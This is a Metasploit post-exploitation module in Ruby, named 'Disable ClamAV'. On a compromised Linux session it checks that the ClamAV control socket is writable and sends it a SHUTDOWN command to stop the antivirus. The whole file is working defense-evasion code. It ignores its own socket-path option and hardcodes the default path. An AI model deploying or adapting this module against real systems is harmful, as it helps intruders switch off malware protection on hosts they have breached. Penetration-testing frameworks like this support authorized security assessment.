##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require "socket"
class MetasploitModule < Msf::Post
  Rank = ExcellentRanking

  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Disable ClamAV',
        'Description' => %q{
          This module will write to the ClamAV Unix socket to shutoff ClamAV.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'DLL_Cool_J'
        ],
        'Platform' => [ 'linux' ],
        'SessionTypes' => [ 'meterpreter', 'shell' ],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_separator
            ]
          }
        }
      )
    )
    register_options(
      [
        OptString.new("CLAMAV_UNIX_SOCKET", [true, "ClamAV unix socket", "/run/clamav/clamd.ctl" ]),
      ], self.class
    )
  end

  def run
    clamav_socket = datastore['CLAMAV_UNIX_SOCKET']
    print_status("Checking file path #{clamav_socket} exists and is writable... ")
		if writable?("#{clamav_socket}")
			print_good("File does exist and is writable!")

      Socket.unix("/run/clamav/clamd.ctl") do |sock|
        print_status("Shutting down ClamAV!")
				sock.write("SHUTDOWN")
			end
			return true
    end
	end

end
